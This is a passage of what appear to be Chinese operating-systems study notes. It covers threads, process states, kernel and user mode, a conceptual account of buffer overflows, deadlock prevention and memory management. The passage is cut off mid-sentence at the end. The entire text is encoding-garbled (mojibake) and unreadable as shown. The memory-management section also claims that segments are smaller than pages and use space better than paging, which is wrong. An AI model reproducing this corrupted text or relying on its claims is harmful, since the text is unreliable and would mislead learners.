¸çº¿ç¨‹å»ºç«‹å’Œé”€æ¯éƒ½æ˜¯ç”±æ“ä½œç³»ç»Ÿè´Ÿè´£ã€é€šè¿‡ç³»ç»Ÿè°ƒç”¨å®Œæˆçš„ï¼Œæ“ä½œç³»ç»Ÿåœ¨è°ƒåº¦æ—¶ï¼Œå‚è€ƒå„è¿›ç¨‹å†…çš„çº¿ç¨‹è¿è¡Œæƒ…å†µåšå‡ºè°ƒåº¦å†³å®šï¼Œå¦‚æœä¸€ä¸ªè¿›ç¨‹ä¸­æ²¡æœ‰å°±ç»ªæ€çš„çº¿ç¨‹ï¼Œé‚£ä¹ˆè¿™ä¸ªè¿›ç¨‹ä¹Ÿä¸ä¼šè¢«è°ƒåº¦å ç”¨CPUã€‚ å’Œå†…æ ¸çº¿ç¨‹ç›¸å¯¹åº”çš„æ˜¯ç”¨æˆ·çº¿ç¨‹ï¼Œç”¨æˆ·çº¿ç¨‹æŒ‡ä¸éœ€è¦å†…æ ¸æ”¯æŒè€Œåœ¨ç”¨æˆ·ç¨‹åºä¸­å®ç°çš„çº¿ç¨‹ï¼Œå…¶ä¸ä¾èµ–äºæ“ä½œç³»ç»Ÿæ ¸å¿ƒï¼Œç”¨æˆ·è¿›ç¨‹åˆ©ç”¨çº¿ç¨‹åº“æä¾›åˆ›å»ºã€åŒæ­¥ã€è°ƒåº¦å’Œç®¡ç†çº¿ç¨‹çš„å‡½æ•°æ¥æ§åˆ¶ç”¨æˆ·çº¿ç¨‹ã€‚ç”¨æˆ·çº¿ç¨‹å¤šè§äºä¸€äº›å†å²æ‚ ä¹…çš„æ“ä½œç³»ç»Ÿï¼Œä¾‹å¦‚Unixæ“ä½œç³»ç»Ÿï¼Œä¸éœ€è¦ç”¨æˆ·æ€/æ ¸å¿ƒæ€åˆ‡æ¢ï¼Œé€Ÿåº¦å¿«ï¼Œæ“ä½œç³»ç»Ÿå†…æ ¸ä¸çŸ¥é“å¤šçº¿ç¨‹çš„å­˜åœ¨ï¼Œå› æ­¤ä¸€ä¸ªçº¿ç¨‹é˜»å¡å°†ä½¿å¾—æ•´ä¸ªè¿›ç¨‹ï¼ˆåŒ…æ‹¬å®ƒçš„æ‰€æœ‰çº¿ç¨‹ï¼‰é˜»å¡ã€‚ç”±äºè¿™é‡Œçš„å¤„ç†å™¨æ—¶é—´ç‰‡åˆ†é…æ˜¯ä»¥è¿›ç¨‹ä¸ºåŸºæœ¬å•ä½ï¼Œæ‰€ä»¥æ¯ä¸ªçº¿ç¨‹æ‰§è¡Œçš„æ—¶é—´ç›¸å¯¹å‡å°‘ä¸ºäº†åœ¨æ“ä½œç³»ç»Ÿä¸­åŠ å…¥çº¿ç¨‹æ”¯æŒï¼Œé‡‡ç”¨äº†åœ¨ç”¨æˆ·ç©ºé—´å¢åŠ è¿è¡Œåº“æ¥å®ç°çº¿ç¨‹ï¼Œè¿™äº›è¿è¡Œåº“è¢«ç§°ä¸ºâ€œçº¿ç¨‹åŒ…â€ï¼Œç”¨æˆ·çº¿ç¨‹æ˜¯ä¸èƒ½è¢«æ“ä½œç³»ç»Ÿæ‰€æ„ŸçŸ¥çš„ã€‚ å¼•å…¥ç”¨æˆ·çº¿ç¨‹ï¼Œå…·ä½“è€Œè¨€ï¼Œæœ‰ä»¥ä¸‹å››ä¸ªæ–¹é¢çš„ä¼˜åŠ¿ï¼šï¼ˆ1ï¼‰å¯ä»¥åœ¨ä¸æ”¯æŒçº¿ç¨‹çš„æ“ä½œç³»ç»Ÿä¸­å®ç°ã€‚ ï¼ˆ2ï¼‰åˆ›å»ºå’Œé”€æ¯çº¿ç¨‹ã€çº¿ç¨‹åˆ‡æ¢ä»£ä»·ç­‰çº¿ç¨‹ç®¡ç†çš„ä»£ä»·æ¯”å†…æ ¸çº¿ç¨‹å°‘å¾—å¤šã€‚ ï¼ˆ3ï¼‰å…è®¸æ¯ä¸ªè¿›ç¨‹å®šåˆ¶è‡ªå·±çš„è°ƒåº¦ç®—æ³•ï¼Œçº¿ç¨‹ç®¡ç†æ¯”è¾ƒçµæ´»ã€‚ ï¼ˆ4ï¼‰çº¿ç¨‹èƒ½å¤Ÿåˆ©ç”¨çš„è¡¨ç©ºé—´å’Œå †æ ˆç©ºé—´æ¯”å†…æ ¸çº§çº¿ç¨‹å¤šã€‚ ç”¨æˆ·çº¿ç¨‹çš„ç¼ºç‚¹ä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ç‚¹ï¼šï¼ˆ1ï¼‰åŒä¸€è¿›ç¨‹ä¸­åªèƒ½åŒæ—¶æœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨è¿è¡Œï¼Œå¦‚æœæœ‰ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨äº†ç³»ç»Ÿè°ƒç”¨è€Œé˜»å¡ï¼Œé‚£ä¹ˆæ•´ä¸ªè¿›ç¨‹éƒ½ä¼šè¢«æŒ‚èµ·ã€‚ ï¼ˆ2ï¼‰é¡µé¢å¤±æ•ˆä¹Ÿä¼šäº§ç”Ÿç±»ä¼¼çš„é—®é¢˜ã€‚ å†…æ ¸çº¿ç¨‹çš„ä¼˜ç¼ºç‚¹åˆšå¥½è·Ÿç”¨æˆ·çº¿ç¨‹ç›¸åã€‚å®é™…ä¸Šï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥ä½¿ç”¨æ··åˆçš„æ–¹å¼æ¥å®ç°çº¿ç¨‹ã€‚ è¿›ç¨‹æœ‰å“ªå‡ ç§çŠ¶æ€ï¼Ÿå°±ç»ªçŠ¶æ€ï¼šå½“è¿›ç¨‹å·²ç»åˆ†é…åˆ°é™¤CPUä»¥å¤–çš„æ‰€æœ‰å¿…è¦çš„èµ„æºï¼Œåªè¦è·å¾—å¤„ç†æœºä¾¿å¯ç«‹å³æ‰§è¡Œï¼› è¿è¡ŒçŠ¶æ€ï¼šå½“è¿›ç¨‹å·²è·å¾—å¤„ç†æœºï¼Œå…¶ç¨‹åºæ­£åœ¨å¤„ç†æœºä¸Šæ‰§è¡Œï¼› é˜»å¡çŠ¶æ€ï¼š æ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹ï¼Œç”±äºæŸä¸ªäº‹ä»¶å‘ç”Ÿè€Œæ— æ³•æ‰§è¡Œæ—¶ï¼Œä¾¿æ”¾å¼ƒå¤„ç†æœºè€Œå¤„äºé˜»å¡çŠ¶æ€ï¼›å¼•èµ·è¿›ç¨‹é˜»å¡çŠ¶æ€çš„äº‹ä»¶å¯ä»¥æœ‰å¤šç§ï¼Œä¾‹å¦‚ï¼Œç­‰å¾…I/Oå®Œæˆã€ç”³è¯·ç¼“å†²åŒºä¸èƒ½æ»¡è¶³ã€ç­‰å¾…ä¿¡ä»¶ï¼ˆä¿¡å·ï¼‰ã€‚ æ³¨æ„åŒºåˆ«å°±ç»ªçŠ¶æ€å’Œç­‰å¾…çŠ¶æ€ï¼šå°±ç»ªçŠ¶æ€æ˜¯æŒ‡è¿›ç¨‹ä»…ç¼ºå°‘å¤„ç†æœºï¼Œåªè¦è·å¾—å¤„ç†æœºèµ„æºå°±ç«‹å³æ‰§è¡Œï¼›è€Œç­‰å¾…çŠ¶æ€æ˜¯æŒ‡è¿›ç¨‹éœ€è¦å…¶ä»–èµ„æºï¼ˆé™¤äº†å¤„ç†æœºï¼‰æˆ–ç­‰å¾…æŸä¸€äº‹ä»¶ã€‚ å°±ç»ªçŠ¶æ€ -&gt; è¿è¡ŒçŠ¶æ€ï¼šå¤„äºå°±ç»ªçŠ¶æ€çš„è¿›ç¨‹è¢«è°ƒåº¦åï¼Œè·å¾—å¤„ç†æœºèµ„æºï¼ˆåˆ†æ´¾å¤„ç†æœºæ—¶é—´ç‰‡ï¼‰ï¼Œäºæ˜¯è¿›ç¨‹ç”±å°±ç»ªçŠ¶æ€è½¬æ¢ä¸ºè¿è¡ŒçŠ¶æ€ã€‚ è¿è¡ŒçŠ¶æ€ -&gt; å°±ç»ªçŠ¶æ€ï¼šå¤„äºè¿è¡ŒçŠ¶æ€çš„è¿›ç¨‹åœ¨æ—¶é—´ç‰‡ç”¨å®Œåï¼Œä¸å¾—ä¸è®©å‡ºå¤„ç†æœºï¼Œä»è€Œè¿›ç¨‹ç”±è¿è¡ŒçŠ¶æ€è½¬æ¢ä¸ºå°±ç»ªçŠ¶æ€ã€‚æ­¤å¤–ï¼Œåœ¨å¯å‰¥å¤ºçš„æ“ä½œç³»ç»Ÿä¸­ï¼Œå½“æœ‰æ›´é«˜ä¼˜å…ˆçº§çš„è¿›ç¨‹å°± ã€ ç»ªæ—¶ï¼Œè°ƒåº¦ç¨‹åº¦å°†æ­£æ‰§è¡Œçš„è¿›ç¨‹è½¬æ¢ä¸ºå°±ç»ªçŠ¶æ€ï¼Œè®©æ›´é«˜ä¼˜å…ˆçº§çš„è¿›ç¨‹æ‰§è¡Œã€‚ è¿è¡ŒçŠ¶æ€ -&gt; é˜»å¡çŠ¶æ€ï¼šå½“è¿›ç¨‹è¯·æ±‚æŸä¸€èµ„æºï¼ˆå¦‚å¤–è®¾ï¼‰çš„ä½¿ç”¨å’Œåˆ†é…æˆ–ç­‰å¾…æŸä¸€äº‹ä»¶çš„å‘ç”Ÿï¼ˆå¦‚I/Oæ“ä½œçš„å®Œæˆï¼‰æ—¶ï¼Œå®ƒå°±ä»è¿è¡ŒçŠ¶æ€è½¬æ¢ä¸ºé˜»å¡çŠ¶æ€ã€‚è¿›ç¨‹ä»¥ç³»ç»Ÿè°ƒç”¨çš„å½¢å¼è¯·æ±‚æ“ä½œç³»ç»Ÿæä¾›æœåŠ¡ï¼Œè¿™æ˜¯ä¸€ç§ç‰¹æ®Šçš„ã€ç”±è¿è¡Œç”¨æˆ·æ€ç¨‹åºè°ƒç”¨æ“ä½œç³»ç»Ÿå†…æ ¸è¿‡ç¨‹çš„å½¢å¼ã€‚ é˜»å¡çŠ¶æ€ -&gt; å°±ç»ªçŠ¶æ€ï¼šå½“è¿›ç¨‹ç­‰å¾…çš„äº‹ä»¶åˆ°æ¥æ—¶ï¼Œå¦‚I/Oæ“ä½œç»“æŸæˆ–ä¸­æ–­ç»“æŸæ—¶ï¼Œä¸­æ–­å¤„ç†ç¨‹åºå¿…é¡»æŠŠç›¸åº”è¿›ç¨‹çš„çŠ¶æ€ç”±é˜»å¡çŠ¶æ€è½¬æ¢ä¸ºå°±ç»ªçŠ¶æ€ã€‚ ç”¨æˆ·æ€å’Œæ ¸å¿ƒæ€çš„åŒºåˆ«ã€‚å½“ä¸€ä¸ªä»»åŠ¡ï¼ˆè¿›ç¨‹ï¼‰æ‰§è¡Œç³»ç»Ÿè°ƒç”¨è€Œé™·å…¥å†…æ ¸ä»£ç ä¸­æ‰§è¡Œæ—¶ï¼Œæˆ‘ä»¬å°±ç§°è¿›ç¨‹å¤„äºå†…æ ¸è¿è¡Œæ€ï¼ˆæˆ–ç®€ç§°ä¸ºå†…æ ¸æ€ï¼‰ã€‚æ­¤æ—¶å¤„ç†å™¨å¤„äºç‰¹æƒçº§æœ€é«˜çš„ï¼ˆ0çº§ï¼‰å†…æ ¸ä»£ç ä¸­æ‰§è¡Œã€‚å½“è¿›ç¨‹å¤„äºå†…æ ¸æ€æ—¶ï¼Œæ‰§è¡Œçš„å†…æ ¸ä»£ç ä¼šä½¿ç”¨å½“å‰è¿›ç¨‹çš„å†…æ ¸æ ˆã€‚æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„å†…æ ¸æ ˆã€‚å½“è¿›ç¨‹åœ¨æ‰§è¡Œç”¨æˆ·è‡ªå·±çš„ä»£ç æ—¶ï¼Œåˆ™ç§°å…¶å¤„äºç”¨æˆ·è¿è¡Œæ€ï¼ˆç”¨æˆ·æ€ï¼‰ã€‚å³æ­¤æ—¶å¤„ç†å™¨åœ¨ç‰¹æƒçº§æœ€ä½çš„ï¼ˆ3çº§ï¼‰ç”¨æˆ·ä»£ç ä¸­è¿è¡Œã€‚å½“æ­£åœ¨æ‰§è¡Œç”¨æˆ·ç¨‹åºè€Œçªç„¶è¢«ä¸­æ–­ç¨‹åºä¸­æ–­æ—¶ï¼Œæ­¤æ—¶ç”¨æˆ·ç¨‹åºä¹Ÿå¯ä»¥è±¡å¾æ€§åœ°ç§°ä¸ºå¤„äºè¿›ç¨‹çš„å†…æ ¸æ€ã€‚å› ä¸ºä¸­æ–­å¤„ç†ç¨‹åºå°†ä½¿ç”¨å½“å‰è¿›ç¨‹çš„å†…æ ¸æ ˆã€‚è¿™ä¸å¤„äºå†…æ ¸æ€çš„è¿›ç¨‹çš„çŠ¶æ€æœ‰äº›ç±»ä¼¼ã€‚ ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€çš„3ç§æ–¹å¼ï¼šç³»ç»Ÿè°ƒç”¨ã€å¼‚å¸¸ã€å¤–å›´è®¾å¤‡ä¸­æ–­ã€‚ ä»€ä¹ˆæ˜¯ç¼“å†²åŒºæº¢å‡ºï¼Ÿæœ‰ä»€ä¹ˆå±å®³ï¼Ÿå…¶åŸå› æ˜¯ä»€ä¹ˆï¼Ÿç¼“å†²åŒºæº¢å‡ºæ˜¯æŒ‡å½“è®¡ç®—æœºå‘ç¼“å†²åŒºå†…å¡«å……æ•°æ®æ—¶è¶…è¿‡äº†ç¼“å†²åŒºæœ¬èº«çš„å®¹é‡ï¼Œæº¢å‡ºçš„æ•°æ®è¦†ç›–åœ¨åˆæ³•æ•°æ®ä¸Šã€‚ å±å®³ï¼šåœ¨å½“å‰ç½‘ç»œä¸åˆ†å¸ƒå¼ç³»ç»Ÿå®‰å…¨ä¸­ï¼Œè¢«å¹¿æ³›åˆ©ç”¨çš„50%ä»¥ä¸Šéƒ½æ˜¯ç¼“å†²åŒºæº¢å‡ºï¼Œå…¶ä¸­æœ€è‘—åçš„ä¾‹å­æ˜¯1988å¹´åˆ©ç”¨fingerdæ¼æ´çš„è •è™«ã€‚è€Œç¼“å†²åŒºæº¢å‡ºä¸­ï¼Œæœ€ä¸ºå±é™©çš„æ˜¯å †æ ˆæº¢å‡ºï¼Œå› ä¸ºå…¥ä¾µè€…å¯ä»¥åˆ©ç”¨å †æ ˆæº¢å‡ºï¼Œåœ¨å‡½æ•°è¿”å›æ—¶æ”¹å˜è¿”å›ç¨‹åºçš„åœ°å€ï¼Œè®©å…¶è·³è½¬åˆ°ä»»æ„åœ°å€ï¼Œå¸¦æ¥çš„å±å®³ä¸€ç§æ˜¯ç¨‹åºå´©æºƒå¯¼è‡´æ‹’ç»æœåŠ¡ï¼Œå¦å¤–ä¸€ç§å°±æ˜¯è·³è½¬å¹¶ä¸”æ‰§è¡Œä¸€æ®µæ¶æ„ä»£ç ï¼Œæ¯”å¦‚å¾—åˆ°shellï¼Œç„¶åä¸ºæ‰€æ¬²ä¸ºã€‚é€šè¿‡å¾€ç¨‹åºçš„ç¼“å†²åŒºå†™è¶…å‡ºå…¶é•¿åº¦çš„å†…å®¹ï¼Œé€ æˆç¼“å†²åŒºçš„æº¢å‡ºï¼Œä»è€Œç ´åç¨‹åºçš„å †æ ˆï¼Œä½¿ç¨‹åºè½¬è€Œæ‰§è¡Œå…¶å®ƒæŒ‡ä»¤ï¼Œä»¥è¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚ é€ æˆç¼“å†²åŒºæº¢å‡ºçš„ä¸»åŸå› æ˜¯ç¨‹åºä¸­æ²¡æœ‰ä»”ç»†æ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„å‚æ•°ã€‚ æ­»é”æ­»é”çš„æ¦‚å¿µ æ‰€è°“æ­»é”æ˜¯æŒ‡ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„è¿›ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå› äº‰å¤ºèµ„æºè€Œé€ æˆçš„ä¸€ç§äº’ç›¸ç­‰å¾…çš„ç°è±¡ï¼Œè‹¥æ— å¤–åŠ›ä½œç”¨ï¼Œå®ƒä»¬éƒ½å°†æ— æ³•æ¨è¿›ä¸‹å»ï¼Œæ­¤æ—¶ç§°ç³»ç»Ÿå¤„äºæ­»é”çŠ¶æ€æˆ–ç³»ç»Ÿäº§ç”Ÿäº†æ­»é”ã€‚é€šä¿—çš„è®²ï¼Œå°±æ˜¯ä¸¤ä¸ªæˆ–å¤šä¸ªè¿›ç¨‹æ— é™æœŸçš„é˜»å¡ã€ç›¸äº’ç­‰å¾…çš„ä¸€ç§çŠ¶æ€ã€‚ æ­»é”äº§ç”Ÿçš„å››ä¸ªå¿…è¦æ¡ä»¶ äº’æ–¥æ¡ä»¶ï¼šä¸€ä¸ªèµ„æºæ¯æ¬¡åªèƒ½è¢«ä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨ï¼›è‹¥å…¶ä»–è¿›ç¨‹ç”³è¯·ä½¿ç”¨è¯¥èµ„æºï¼Œå¿…é¡»ç­‰åˆ°è¯¥èµ„æºè¢«é‡Šæ”¾ä¸ºæ­¢ï¼› è¯·æ±‚ä¸ä¿æŒæ¡ä»¶ï¼šä¸€ä¸ªè¿›ç¨‹å› è¯·æ±‚èµ„æºè€Œé˜»å¡æ—¶ï¼Œå¯¹å·²è·å¾—çš„èµ„æºä¿æŒä¸æ”¾ï¼› ä¸å¯å‰¥å¤ºæ¡ä»¶ï¼šè¿›ç¨‹å·²è·å¾—çš„èµ„æºï¼Œåœ¨æœªä½¿ç”¨å®Œä¹‹å‰ï¼Œä¸èƒ½å¼ºè¡Œå‰¥å¤ºï¼› å¾ªç¯ç­‰å¾…æ¡ä»¶ï¼šè‹¥å¹²è¿›ç¨‹ä¹‹é—´å½¢æˆä¸€ç§å¤´å°¾ç›¸æ¥çš„ç¯å½¢ç­‰å¾…èµ„æºå…³ç³»ï¼› æ­»é”çš„è§£é™¤ä¸é¢„é˜²1 æ­»é”é¢„é˜²æ­»é”é¢„é˜²çš„åŸºæœ¬æ€æƒ³æ˜¯ åªè¦ç¡®ä¿æ­»é”å‘ç”Ÿçš„å››ä¸ªå¿…è¦æ¡ä»¶ä¸­è‡³å°‘æœ‰ä¸€ä¸ªä¸æˆç«‹ï¼Œå°±èƒ½é¢„é˜²æ­»é”çš„å‘ç”Ÿï¼Œå…·ä½“æ–¹æ³•åŒ…æ‹¬ï¼š æ³¨æ„ï¼šäº’æ–¥æ¡ä»¶æ— æ³•ç ´å æ‰“ç ´è¯·æ±‚ä¸ä¿æŒæ¡ä»¶ï¼šå¯ä»¥å®è¡Œèµ„æºé¢„å…ˆåˆ†é…ç­–ç•¥(è¿›ç¨‹åœ¨è¿è¡Œå‰ä¸€æ¬¡æ€§å‘ç³»ç»Ÿç”³è¯·å®ƒæ‰€éœ€è¦çš„å…¨éƒ¨èµ„æºï¼Œè‹¥æ‰€éœ€å…¨éƒ¨èµ„æºå¾—ä¸åˆ°æ»¡è¶³ï¼Œåˆ™ä¸åˆ†é…ä»»ä½•èµ„æºï¼Œæ­¤è¿›ç¨‹æš‚ä¸è¿è¡Œï¼›åªæœ‰å½“ç³»ç»Ÿèƒ½æ»¡è¶³å½“å‰è¿›ç¨‹æ‰€éœ€çš„å…¨éƒ¨èµ„æºæ—¶ï¼Œæ‰ä¸€æ¬¡æ€§å°†æ‰€ç”³è¯·èµ„æºå…¨éƒ¨åˆ†é…ç»™è¯¥çº¿ç¨‹)æˆ–è€…åªå…è®¸è¿›ç¨‹åœ¨æ²¡æœ‰å ç”¨èµ„æºæ—¶æ‰å¯ä»¥ç”³è¯·èµ„æºï¼ˆä¸€ä¸ªè¿›ç¨‹å¯ç”³è¯·ä¸€äº›èµ„æºå¹¶ä½¿ç”¨å®ƒä»¬ï¼Œä½†æ˜¯åœ¨å½“å‰è¿›ç¨‹ç”³è¯·æ›´å¤šèµ„æºä¹‹å‰ï¼Œå®ƒå¿…é¡»å…¨éƒ¨é‡Šæ”¾å½“å‰æ‰€å æœ‰çš„èµ„æºï¼‰ã€‚ä½†æ˜¯è¿™ç§ç­–ç•¥ä¹Ÿå­˜åœ¨ä¸€äº›ç¼ºç‚¹ï¼šåœ¨å¾ˆå¤šæƒ…å†µä¸‹ï¼Œæ— æ³•é¢„çŸ¥ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œå‰æ‰€éœ€çš„å…¨éƒ¨èµ„æºï¼Œå› ä¸ºè¿›ç¨‹æ˜¯åŠ¨æ€æ‰§è¡Œçš„ï¼Œä¸å¯é¢„çŸ¥çš„ï¼›åŒæ—¶ï¼Œä¼šé™ä½èµ„æºåˆ©ç”¨ç‡ï¼Œå¯¼è‡´é™ä½äº†è¿›ç¨‹çš„å¹¶å‘æ€§ã€‚ æ‰“ç ´ä¸å¯å‰¥å¤ºæ¡ä»¶ï¼šå…è®¸è¿›ç¨‹å¼ºå‰¥å¤ºä½¿ç”¨å…¶ä»–è¿›ç¨‹å æœ‰çš„èµ„æºï¼Œä»è€Œç ´åä¸å¯å‰¥å¤ºæ¡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªè¿›ç¨‹å æœ‰äº†ä¸€éƒ¨åˆ†èµ„æºï¼Œåœ¨å…¶ç”³è¯·æ–°çš„èµ„æºä¸”å¾—ä¸åˆ°æ»¡è¶³æ—¶ï¼Œå®ƒå¿…é¡»é‡Šæ”¾æ‰€æœ‰å æœ‰çš„èµ„æºä»¥ä¾¿è®©å…¶å®ƒçº¿ç¨‹ä½¿ç”¨ã€‚è¿™ç§é¢„é˜²æ­»é”çš„æ–¹å¼å®ç°èµ·æ¥å›°éš¾ï¼Œä¼šé™ä½ç³»ç»Ÿæ€§èƒ½ã€‚ æ‰“ç ´å¾ªç¯ç­‰å¾…æ¡ä»¶ï¼šå®è¡Œèµ„æºæœ‰åºåˆ†é…ç­–ç•¥ï¼Œç ´åç¯è·¯æ¡ä»¶ã€‚å¯¹æ‰€æœ‰èµ„æºæ’åºç¼–å·ï¼Œæ‰€æœ‰è¿›ç¨‹å¯¹èµ„æºçš„è¯·æ±‚å¿…é¡»ä¸¥æ ¼æŒ‰èµ„æºåºå·é€’å¢çš„é¡ºåºæå‡ºï¼Œå³åªæœ‰å ç”¨äº†å°å·èµ„æºæ‰èƒ½ç”³è¯·å¤§å·èµ„æºï¼Œè¿™æ ·å°±ä¸å›äº§ç”Ÿç¯è·¯ï¼Œé¢„é˜²æ­»é”çš„å‘ç”Ÿã€‚ 2æ­»é”é¿å…çš„åŸºæœ¬æ€æƒ³æ­»é”é¿å…çš„åŸºæœ¬æ€æƒ³æ˜¯åŠ¨æ€åœ°æ£€æµ‹èµ„æºåˆ†é…çŠ¶æ€ï¼Œä»¥ç¡®ä¿å¾ªç¯ç­‰å¾…æ¡ä»¶ä¸æˆç«‹ï¼Œä»è€Œç¡®ä¿ç³»ç»Ÿå¤„äºå®‰å…¨çŠ¶æ€ã€‚æ‰€è°“å®‰å…¨çŠ¶æ€æ˜¯æŒ‡ï¼šå¦‚æœç³»ç»Ÿèƒ½æŒ‰æŸä¸ªé¡ºåºä¸ºæ¯ä¸ªè¿›ç¨‹åˆ†é…èµ„æºï¼ˆä¸è¶…è¿‡å…¶æœ€å¤§å€¼ï¼‰ï¼Œé‚£ä¹ˆç³»ç»ŸçŠ¶æ€æ˜¯å®‰å…¨çš„ï¼Œæ¢å¥è¯è¯´å°±æ˜¯ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªå®‰å…¨åºåˆ—ï¼Œé‚£ä¹ˆç³»ç»Ÿå¤„äºå®‰å…¨çŠ¶æ€ã€‚èµ„æºåˆ†é…å›¾ç®—æ³•å’Œé“¶è¡Œå®¶ç®—æ³•æ˜¯ä¸¤ç§ç»å…¸çš„æ­»é”é¿å…çš„ç®—æ³•ï¼Œå…¶å¯ä»¥ç¡®ä¿ç³»ç»Ÿå§‹ç»ˆå¤„äºå®‰å…¨çŠ¶æ€ã€‚å…¶ä¸­ï¼Œèµ„æºåˆ†é…å›¾ç®—æ³•åº”ç”¨åœºæ™¯ä¸ºæ¯ç§èµ„æºç±»å‹åªæœ‰ä¸€ä¸ªå®ä¾‹(ç”³è¯·è¾¹ï¼Œåˆ†é…è¾¹ï¼Œéœ€æ±‚è¾¹ï¼Œä¸å½¢æˆç¯æ‰å…è®¸åˆ†é…)ï¼Œè€Œé“¶è¡Œå®¶ç®—æ³•åº”ç”¨äºæ¯ç§èµ„æºç±»å‹å¯ä»¥æœ‰å¤šä¸ªå®ä¾‹çš„åœºæ™¯ã€‚ é“¶è¡Œå®¶ç®—æ³•ï¼šè¯¥ç®—æ³•éœ€è¦æ£€æŸ¥ç”³è¯·è€…å¯¹èµ„æºçš„æœ€å¤§éœ€æ±‚é‡ï¼Œå¦‚æœç³»ç»Ÿç°å­˜çš„å„ç±»èµ„æºå¯ä»¥æ»¡è¶³ç”³è¯·è€…çš„è¯·æ±‚ï¼Œå°±æ»¡è¶³ç”³è¯·è€…çš„è¯·æ±‚ã€‚è¿™æ ·ç”³è¯·è€…å°±å¯ä»¥å¾ˆå¿«å®Œæˆå…¶è®¡ç®—ï¼Œç„¶åé‡Šæ”¾å®ƒå ç”¨çš„èµ„æºï¼Œä»è€Œä¿è¯äº†ç³»ç»Ÿä¸­æ‰€æœ‰è¿›ç¨‹éƒ½èƒ½å®Œæˆï¼Œæ‰€ä»¥å¯é¿å…æ­»é”çš„å‘ç”Ÿã€‚ å†…å­˜ç®¡ç†æœ‰å“ªå‡ ç§æ–¹å¼(å—å¼ã€é¡µå¼ã€æ®µå¼ã€æ®µé¡µå¼).å†…å­˜ç®¡ç†æœ‰å—å¼ç®¡ç†ï¼Œé¡µå¼ç®¡ç†ï¼Œæ®µå¼å’Œæ®µé¡µå¼ç®¡ç†ã€‚ç°åœ¨å¸¸ç”¨æ®µé¡µå¼ç®¡ç†ã€‚ å—å¼ç®¡ç†ï¼šæŠŠä¸»å­˜åˆ†ä¸ºä¸€å¤§å—ã€ä¸€å¤§å—çš„ï¼Œå½“æ‰€éœ€çš„ç¨‹åºç‰‡æ–­ä¸åœ¨ä¸»å­˜æ—¶å°±åˆ†é…ä¸€å—ä¸»å­˜ç©ºé—´ï¼ŒæŠŠç¨‹åºç‰‡æ–­loadå…¥ä¸»å­˜ï¼Œå°±ç®—æ‰€éœ€çš„ç¨‹åºç‰‡åº¦åªæœ‰å‡ ä¸ªå­—èŠ‚ä¹Ÿåªèƒ½æŠŠè¿™ä¸€å—åˆ†é…ç»™å®ƒã€‚è¿™æ ·ä¼šé€ æˆå¾ˆå¤§çš„æµªè´¹ï¼Œå¹³å‡æµªè´¹äº†50ï¼…çš„å†…å­˜ç©ºé—´ï¼Œä½†æ˜¯æ˜“äºç®¡ç†ã€‚ é¡µå¼ç®¡ç†ï¼šæŠŠä¸»å­˜åˆ†ä¸ºä¸€é¡µä¸€é¡µçš„ï¼Œæ¯ä¸€é¡µçš„ç©ºé—´è¦æ¯”ä¸€å—ä¸€å—çš„ç©ºé—´å°å¾ˆå¤šï¼Œæ˜¾ç„¶è¿™ç§æ–¹æ³•çš„ç©ºé—´åˆ©ç”¨ç‡è¦æ¯”å—å¼ç®¡ç†é«˜å¾ˆå¤šã€‚ æ®µå¼ç®¡ç†ï¼šæŠŠä¸»å­˜åˆ†ä¸ºä¸€æ®µä¸€æ®µçš„ï¼Œæ¯ä¸€æ®µçš„ç©ºé—´åˆè¦æ¯”ä¸€é¡µä¸€é¡µçš„ç©ºé—´å°å¾ˆå¤šï¼Œè¿™ç§æ–¹æ³•åœ¨ç©ºé—´åˆ©ç”¨ç‡ä¸Šåˆæ¯”é¡µå¼ç®¡ç†é«˜å¾ˆå¤šï¼Œä½†æ˜¯ä¹Ÿæœ‰å¦å¤–ä¸€ä¸ªç¼ºç‚¹ã€‚ä¸€ä¸ªç¨‹åºç‰‡æ–­å¯èƒ½ä¼šè¢«åˆ†ä¸ºå‡ åæ®µï¼Œè¿™æ ·å¾ˆå¤šæ—¶é—´å°±ä¼šè¢«æµªè´¹åœ¨è®¡ç®—æ¯ä¸€æ®µçš„ç‰©ç†åœ°å€ä¸Šã€‚ æ®µé¡µå¼ç®¡ç†ï¼šç»“åˆäº†æ®µå¼ç®¡ç†å’Œé¡µå¼ç®¡ç†çš„ä¼˜ç‚¹ã€‚å°†ç¨‹åºåˆ†æˆè‹¥å¹²æ®µï¼Œæ¯ä¸ªæ®µåˆ†æˆè‹¥å¹²é¡µã€‚æ®µé¡µå¼ç®¡ç†æ¯å–ä¸€æ•°æ®ï¼Œè¦è®¿é—®3æ¬¡å†…å­˜ã€‚ åˆ†é¡µå’Œåˆ†æ®µæœ‰ä»€ä¹ˆåŒºåˆ«ï¼ˆå†…å­˜ç®¡ç†ï¼‰ï¼Ÿâ€‹ æ®µå¼å­˜å‚¨ç®¡ç†æ˜¯ä¸€ç§ç¬¦åˆç”¨æˆ·è§†è§’çš„å†…å­˜åˆ†é…ç®¡ç†æ–¹æ¡ˆã€‚åœ¨æ®µå¼å­˜å‚¨ç®¡ç†ä¸­ï¼Œå°†ç¨‹åºçš„åœ°å€ç©ºé—´åˆ’åˆ†ä¸ºè‹¥å¹²æ®µï¼ˆsegmentï¼‰ï¼Œå¦‚ä»£ç æ®µï¼Œæ•°æ®æ®µï¼Œå †æ ˆæ®µï¼›è¿™æ ·æ¯ä¸ªè¿›ç¨‹æœ‰ä¸€ä¸ªäºŒç»´åœ°å€ç©ºé—´ï¼Œç›¸äº’ç‹¬ç«‹ï¼Œäº’ä¸å¹²æ‰°ã€‚æ®µå¼ç®¡ç†çš„ä¼˜ç‚¹æ˜¯ï¼šæ²¡æœ‰å†…ç¢ç‰‡ï¼ˆå› 